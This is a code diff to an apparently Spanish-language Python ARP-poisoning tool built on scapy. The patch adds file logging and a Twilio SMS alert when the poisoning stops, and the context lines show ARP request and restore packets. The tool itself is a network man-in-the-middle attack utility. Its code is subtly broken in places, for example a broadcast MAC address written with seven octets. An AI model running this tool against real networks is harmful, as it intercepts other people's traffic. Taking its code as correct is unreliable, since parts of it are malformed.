@@ -8,9 +8,26 @@ from os import *
 import shutil
 import sys
 import time
+from twilio.rest import Client
 from multiprocessing import Process
 import keys
 from scapy.all import *
+today = datetime.now()
+try:
+	if os.path.exists('REPORTES/Output.txt'):
+		remove('REPORTES/Output.txt') 
+		
+	else:
+		os.mkdir("REPORTES")
+except:
+	pass
+
+FILENAME_LOGGING = "Output.txt"
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.DEBUG)
+logger.addHandler(logging.StreamHandler(sys.stdout))
+logger.addHandler(logging.FileHandler(FILENAME_LOGGING))
+shutil.move("Output.txt", "REPORTES/Output.txt")
 def get_mac(targetip):
 	packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
 	resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
@@ -108,6 +125,19 @@ class Arper():
 			time.sleep(2)
 		except:
 			print('Reporte fallido, intente de nuevo...')
+		try:
+			logger.info('Enviando alerta a SMS...')
+			time.sleep(2)
+			client = Client(keys.account_sid, keys.auth_token)
+			message = client.messages.create(
+				body="Alerta! Se ha detenido el envenenamiento ARP",
+				from_=keys.twilio_number,
+				to=keys.target_number)
+			logger.info('Alerta enviada exitosamente...')
+			time.sleep(2)
+
+		except:
+			print('Ups, algo ha salido mal...')
 
 		send(ARP(
 				op=2,
